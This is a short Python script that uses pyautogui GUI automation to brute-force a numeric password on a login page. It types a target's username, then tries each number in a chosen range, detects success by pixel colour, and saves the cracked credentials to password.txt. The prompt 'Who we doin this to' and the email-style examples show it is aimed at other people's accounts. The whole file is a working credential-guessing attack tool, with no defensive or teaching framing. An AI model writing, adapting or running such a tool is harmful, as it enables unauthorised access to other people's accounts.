from pyautogui import *
from time import sleep

start = int(input('What is your starting number (ex: 60000 or 00000):         '))
end = int(input('What is your ending number (ex: 60000 or 99999):         '))
who = input('Who we doin this to (ex: khull2896@xxxxx.org or gramby5139@xxxxx.org):      ')

def no():
    global wait
    while wait:
        if pixel(1700, 400) != (22,22,23):
            wait = False
        sleep(0.01)
    wait = True
    sleep(0.1)

wait = True

sleep(3)

moveTo(1218,399)
leftClick()
typewrite(who)
press('enter')

no()
sleep(2)
for i in range(start, end+1):
    typewrite(str(i))
    press('enter')

    no()

    if pixel(1450,125) == (248,250,253):
        print('done')
        with open('password.txt', 'a') as file:
            file.write(f'\nUsername: {who}   Password: {i}')
        print(f'Username: {who}   Password: {i}')
        break
    else:
        print(i)